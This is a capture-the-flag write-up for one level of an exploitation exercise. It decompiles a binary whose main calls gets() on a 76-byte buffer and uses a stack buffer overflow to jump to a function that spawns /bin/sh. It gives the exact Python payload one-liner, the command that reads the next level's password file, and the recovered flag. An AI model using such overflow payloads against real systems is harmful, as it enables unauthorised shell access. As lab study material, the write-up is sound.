get the binary on host
* `scp -P 4242 level1@192.168.56.107:./level1 ./binary/level1`

decompile using ghidra\
main fonction is
```
	void main(void)
	{
		undefined local_50 [76];
		
		gets(local_50);
		return;
	}
```
and this fonction exist too 
```
	void run(void)

	{
		fwrite("Good... Wait what?\n",1,0x13,stdout);
		system("/bin/sh");
		return;
	}
```

we can use a buffer overflow to call this function
```
(gdb) disas run
	Dump of assembler code for function run:
		0x08048444 <+0>:     push   %ebp
		0x08048445 <+1>:     mov    %esp,%ebp
		0x08048447 <+3>:     sub    $0x18,%esp
		0x0804844a <+6>:     mov    0x80497c0,%eax
		0x0804844f <+11>:    mov    %eax,%edx
		0x08048451 <+13>:    mov    $0x8048570,%eax
		0x08048456 <+18>:    mov    %edx,0xc(%esp)
		0x0804845a <+22>:    movl   $0x13,0x8(%esp)
		0x08048462 <+30>:    movl   $0x1,0x4(%esp)
		0x0804846a <+38>:    mov    %eax,(%esp)
		0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
		0x08048472 <+46>:    movl   $0x8048584,(%esp)
		0x08048479 <+53>:    call   0x8048360 <system@plt>
		0x0804847e <+58>:    leave  
		0x0804847f <+59>:    ret    
	End of assembler dump.
```
`call system("/bin/sh") addr` => 0x08048444\
Using our 76 char array + thoose address we can lauch a new shell.\
This array is `76 char` + `addr run`
* `python -c 'print "a"* 76 + "\x44\x84\x04\x08"' > /tmp/exploit_1; cat /tmp/exploit_1 - | ./level1`

\
We can input our cat
* `cat /home/user/level2/.pass`

and get the pass `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`
